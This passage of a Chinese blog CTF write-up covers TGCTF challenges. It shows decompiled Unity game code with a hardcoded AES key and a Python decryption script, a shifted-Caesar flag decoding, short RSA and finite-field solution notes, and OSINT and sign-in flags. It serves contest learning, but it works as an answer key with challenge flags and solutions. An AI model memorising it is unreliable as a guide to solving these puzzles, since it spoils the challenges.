+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Token: 0x02000005 RID: 5
+</span></span><span class="line"><span class="cl">[DefaultExecutionOrder(-1)]
+</span></span><span class="line"><span class="cl">public class GameManager : MonoBehaviour
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">	// Token: 0x17000003 RID: 3
+</span></span><span class="line"><span class="cl">	// (get) Token: 0x06000013 RID: 19 RVA: 0x00002351 File Offset: 0x00000551
+</span></span><span class="line"><span class="cl">	// (set) Token: 0x06000014 RID: 20 RVA: 0x00002358 File Offset: 0x00000558
+</span></span><span class="line"><span class="cl">	public static GameManager Instance { get; private set; }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x17000004 RID: 4
+</span></span><span class="line"><span class="cl">	// (get) Token: 0x06000015 RID: 21 RVA: 0x00002360 File Offset: 0x00000560
+</span></span><span class="line"><span class="cl">	// (set) Token: 0x06000016 RID: 22 RVA: 0x00002368 File Offset: 0x00000568
+</span></span><span class="line"><span class="cl">	public int score { get; private set; }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x06000017 RID: 23 RVA: 0x00002371 File Offset: 0x00000571
+</span></span><span class="line"><span class="cl">	private void Awake()
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		if (GameManager.Instance != null)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			Object.DestroyImmediate(base.gameObject);
+</span></span><span class="line"><span class="cl">			return;
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		GameManager.Instance = this;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x06000018 RID: 24 RVA: 0x00002392 File Offset: 0x00000592
+</span></span><span class="line"><span class="cl">	private void OnDestroy()
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		if (GameManager.Instance == this)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			GameManager.Instance = null;
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x06000019 RID: 25 RVA: 0x000023A7 File Offset: 0x000005A7
+</span></span><span class="line"><span class="cl">	private void Start()
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		this.NewGame();
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x0600001A RID: 26 RVA: 0x000023B0 File Offset: 0x000005B0
+</span></span><span class="line"><span class="cl">	private void NewGame()
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		Time.timeScale = 1f;
+</span></span><span class="line"><span class="cl">		this.ClearScene();
+</span></span><span class="line"><span class="cl">		this.blade.enabled = true;
+</span></span><span class="line"><span class="cl">		this.spawner.enabled = true;
+</span></span><span class="line"><span class="cl">		this.score = 0;
+</span></span><span class="line"><span class="cl">		this.scoreText.text = this.score.ToString();
+</span></span><span class="line"><span class="cl">		if (this.decryptedTextDisplay != null)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			this.decryptedTextDisplay.text = &#34;&#34;;
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x0600001B RID: 27 RVA: 0x00002424 File Offset: 0x00000624
+</span></span><span class="line"><span class="cl">	private void ClearScene()
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		Fruit[] array = Object.FindObjectsOfType&lt;Fruit&gt;();
+</span></span><span class="line"><span class="cl">		for (int i = 0; i &lt; array.Length; i++)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			Object.Destroy(array[i].gameObject);
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		Bomb[] array2 = Object.FindObjectsOfType&lt;Bomb&gt;();
+</span></span><span class="line"><span class="cl">		for (int i = 0; i &lt; array2.Length; i++)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			Object.Destroy(array2[i].gameObject);
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x0600001C RID: 28 RVA: 0x00002474 File Offset: 0x00000674
+</span></span><span class="line"><span class="cl">	public void IncreaseScore(int points)
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		this.score += points;
+</span></span><span class="line"><span class="cl">		this.scoreText.text = this.score.ToString();
+</span></span><span class="line"><span class="cl">		if (this.score &gt;= 999999999)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			byte[] cipherText = this.ConvertHexStringToByteArray(GameManager.encryptedHexData);
+</span></span><span class="line"><span class="cl">			string text = this.Decrypt(cipherText, GameManager.encryptionKey, GameManager.iv);
+</span></span><span class="line"><span class="cl">			if (this.decryptedTextDisplay != null)
+</span></span><span class="line"><span class="cl">			{
+</span></span><span class="line"><span class="cl">				this.decryptedTextDisplay.text = text;
+</span></span><span class="line"><span class="cl">			}
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		else if (this.decryptedTextDisplay != null)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			this.decryptedTextDisplay.text = &#34;&#34;;
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		float num = PlayerPrefs.GetFloat(&#34;hiscore&#34;, 0f);
+</span></span><span class="line"><span class="cl">		if ((float)this.score &gt; num)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			num = (float)this.score;
+</span></span><span class="line"><span class="cl">			PlayerPrefs.SetFloat(&#34;hiscore&#34;, num);
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x0600001D RID: 29 RVA: 0x0000253C File Offset: 0x0000073C
+</span></span><span class="line"><span class="cl">	private byte[] ConvertHexStringToByteArray(string hex)
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		int length = hex.Length;
+</span></span><span class="line"><span class="cl">		byte[] array = new byte[length / 2];
+</span></span><span class="line"><span class="cl">		for (int i = 0; i &lt; length; i += 2)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		return array;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x0600001E RID: 30 RVA: 0x0000257C File Offset: 0x0000077C
+</span></span><span class="line"><span class="cl">	private string Decrypt(byte[] cipherText, string key, string iv)
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		string result;
+</span></span><span class="line"><span class="cl">		using (Aes aes = Aes.Create())
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			aes.Key = Encoding.UTF8.GetBytes(key);
+</span></span><span class="line"><span class="cl">			aes.IV = Encoding.UTF8.GetBytes(iv);
+</span></span><span class="line"><span class="cl">			aes.Mode = CipherMode.CBC;
+</span></span><span class="line"><span class="cl">			aes.Padding = PaddingMode.PKCS7;
+</span></span><span class="line"><span class="cl">			ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
+</span></span><span class="line"><span class="cl">			using (MemoryStream memoryStream = new MemoryStream(cipherText))
+</span></span><span class="line"><span class="cl">			{
+</span></span><span class="line"><span class="cl">				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
+</span></span><span class="line"><span class="cl">				{
+</span></span><span class="line"><span class="cl">					using (StreamReader streamReader = new StreamReader(cryptoStream))
+</span></span><span class="line"><span class="cl">					{
+</span></span><span class="line"><span class="cl">						result = streamReader.ReadToEnd();
+</span></span><span class="line"><span class="cl">					}
+</span></span><span class="line"><span class="cl">				}
+</span></span><span class="line"><span class="cl">			}
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		return result;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x0600001F RID: 31 RVA: 0x00002658 File Offset: 0x00000858
+</span></span><span class="line"><span class="cl">	public void Explode()
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		this.blade.enabled = false;
+</span></span><span class="line"><span class="cl">		this.spawner.enabled = false;
+</span></span><span class="line"><span class="cl">		base.StartCoroutine(this.ExplodeSequence());
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x06000020 RID: 32 RVA: 0x0000267F File Offset: 0x0000087F
+</span></span><span class="line"><span class="cl">	private IEnumerator ExplodeSequence()
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		float elapsed = 0f;
+</span></span><span class="line"><span class="cl">		float duration = 0.5f;
+</span></span><span class="line"><span class="cl">		while (elapsed &lt; duration)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			float num = Mathf.Clamp01(elapsed / duration);
+</span></span><span class="line"><span class="cl">			this.fadeImage.color = Color.Lerp(Color.clear, Color.white, num);
+</span></span><span class="line"><span class="cl">			Time.timeScale = 1f - num;
+</span></span><span class="line"><span class="cl">			elapsed += Time.unscaledDeltaTime;
+</span></span><span class="line"><span class="cl">			yield return null;
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		yield return new WaitForSecondsRealtime(1f);
+</span></span><span class="line"><span class="cl">		this.NewGame();
+</span></span><span class="line"><span class="cl">		elapsed = 0f;
+</span></span><span class="line"><span class="cl">		while (elapsed &lt; duration)
+</span></span><span class="line"><span class="cl">		{
+</span></span><span class="line"><span class="cl">			float t = Mathf.Clamp01(elapsed / duration);
+</span></span><span class="line"><span class="cl">			this.fadeImage.color = Color.Lerp(Color.white, Color.clear, t);
+</span></span><span class="line"><span class="cl">			elapsed += Time.unscaledDeltaTime;
+</span></span><span class="line"><span class="cl">			yield return null;
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		yield break;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x0400000F RID: 15
+</span></span><span class="line"><span class="cl">	[SerializeField]
+</span></span><span class="line"><span class="cl">	private Blade blade;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x04000010 RID: 16
+</span></span><span class="line"><span class="cl">	[SerializeField]
+</span></span><span class="line"><span class="cl">	private Spawner spawner;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x04000011 RID: 17
+</span></span><span class="line"><span class="cl">	[SerializeField]
+</span></span><span class="line"><span class="cl">	private Text scoreText;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x04000012 RID: 18
+</span></span><span class="line"><span class="cl">	[SerializeField]
+</span></span><span class="line"><span class="cl">	private Image fadeImage;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x04000013 RID: 19
+</span></span><span class="line"><span class="cl">	[Header(&#34;Decrypted Text Display&#34;)]
+</span></span><span class="line"><span class="cl">	[SerializeField]
+</span></span><span class="line"><span class="cl">	private Text decryptedTextDisplay;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x04000015 RID: 21
+</span></span><span class="line"><span class="cl">	private static readonly string encryptionKey = &#34;HZNUHZNUHZNUHZNU&#34;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x04000016 RID: 22
+</span></span><span class="line"><span class="cl">	private static readonly string iv = &#34;0202005503081501&#34;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Token: 0x04000017 RID: 23
+</span></span><span class="line"><span class="cl">	private static readonly string encryptedHexData = &#34;cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf&#34;;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看到是AES算法</p>
+<p>encryptedHexData是硬编码的十六进制字符串，加密密钥和IV分别是”HZNUHZNUHZNUHZNU”和”0202005503081501”。</p>
+<p>Decrypt方法使用了AES的CBC模式，填充方式是PKCS7。因此，解密时需要正确的密钥和IV，并且密文是经过十六进制编码的，需要先转换回字节数组。</p>
+<p>加密数据：十六进制字符串cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf。</p>
+<p>编写脚本，使用密钥和IV对加密数据进行AES-CBC解密，并处理PKCS7填充。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">from Crypto.Cipher import AES
+</span></span><span class="line"><span class="cl">from Crypto.Util.Padding import unpad
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 加密数据（十六进制字符串）
+</span></span><span class="line"><span class="cl">encrypted_hex = &#34;cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf&#34;
+</span></span><span class="line"><span class="cl">ciphertext = bytes.fromhex(encrypted_hex)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 密钥和IV（UTF-8编码）
+</span></span><span class="line"><span class="cl">key = b&#39;HZNUHZNUHZNUHZNU&#39;  # 16字节
+</span></span><span class="line"><span class="cl">iv = b&#39;0202005503081501&#39;   # 16字节
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 创建AES解密器
+</span></span><span class="line"><span class="cl">cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 解密并去除填充
+</span></span><span class="line"><span class="cl">plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 输出解密结果
+</span></span><span class="line"><span class="cl">print(&#34;解密后的明文:&#34;, plaintext.decode(&#39;utf-8&#39;))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h1 id="crypto">Crypto
+</h1><h2 id="aaaaaaaa真签到">AAAAAAAA·真·签到
+</h2><p>题目：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">给你flag签个到好了
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">诶，我的flag怎么了？？？？
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">好像字母对不上了
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">我的签到怎么办呀，急急急
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">听说福来阁好像是TGCTF开头的喔
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>比较错误前缀UGBRC与正确前缀TGCTF，发现每个字母的移位量依次为-1, 0, +1, +2, +3，即第i个字符（从0开始）移位量为i-1。</p>
+<p>原字符串：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0:U,1:G,2:B,3:R,4:C,5:{,6:R,7:I,8:0,9:G,10:!,11:O,12:0,13:4,14:_,15:5,16:C,17:3,18:_,19:O,20:V,21:U,22:I,23:_,24:D,25:V,26:_,27:M,28:N,29:T,30:B,31:}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对于每个字母字符，移位量是其位置i减1。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">i=0:U →移位-1 →T
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=1:G →0 →G
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=2:B →+1 →C
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=3:R →+2 →T
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=4:C →+3 →F
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=6:R →i=6 →移位5 →R+5=W
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=7:I →移位6 →I+6=O
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=9:G →i=9 →移位8 →G+8=O
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=11:O →i=11 →移位10 →O+10=Y
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=16:C →i=16 →移位15 →C+15=R
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=19:O →i=19 →移位18 →O+18= (O是第14个字母，A=0的话，14+18=32 →32 mod26=6 →G)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=20:V →i=20 →移位19 →V+19= (V是21 →21+19=40 →40 mod26=14 →O)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=21:U →i=21 →移位20 →U+20= (20+20=40 mod26=14 →O)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=22:I →i=22 →移位21 →I+21= (8+21=29 mod26=3 →D)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=24:D →i=24 →移位23 →D+23= (3+23=26 mod26=0 →A)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=25:V →i=25 →移位24 →V+24= (21+24=45 mod26=19 →T)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=27:M →i=27 →移位26 →M+26= (12+26=38 mod26=12 →M)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=28:N →i=28 →移位27 →N+27= (13+27=40 mod26=14 →O)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=29:T →i=29 →移位28 →T+28= (19+28=47 mod26=21 →V)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">i=30:B →i=30 →移位29 →B+29= (1+29=30 mod26=4 →E)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将这些转换后的字母代入原字符串，保持非字母字符不变：</p>
+<blockquote>
+<p>TGCTF{ W O 0 O ! Y 0 4 _ 5 R 3 _ G O O D _ A T _ M O V E }</p></blockquote>
+<p>组合起来：</p>
+<blockquote>
+<p>TGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}</p></blockquote>
+<hr>
+<h2 id="费克特尔">费克特尔
+</h2><p>直接分解n就行</p>
+<h2 id="mm不躲猫猫">mm不躲猫猫
+</h2><p>第一组和第三组的n有一个公因数，于是就分解出来了</p>
+<h2 id="宝宝rsa">宝宝RSA
+</h2><p>第一部分e是素数并且范围比较小直接爆破，第二部分e=3直接开3次根就得到flag</p>
+<h2 id="trwsians">tRwSiAns
+</h2><p>扔到sagemath里解有限域一元二次方程就行了</p>
+<hr>
+<h1 id="misc">Misc
+</h1><h2 id="where-it-isosint">where it is(osint)
+</h2><p>题目说flag形式为TGCTF{右上角轨道到站的站名}</p>
+<p>谷歌搜图，定位到港墘站</p>
+<p>flag{港墘站}</p>
+<hr>
+<h2 id="好运来">好运来
+</h2><p>我听到了强运的回响，flag是CTFer最喜欢的数字：</p>
+<p>TGCTF{114514}</p>
+<h2 id="简单签到关注杭师大网安谢谢喵">简单签到，关注：”杭师大网安“谢谢喵🐱
+</h2><p>关注就发flag（）</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E6%B7%98%E6%B1%B0%E8%B5%9B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">淘汰赛</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        
+            Build by Oight <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
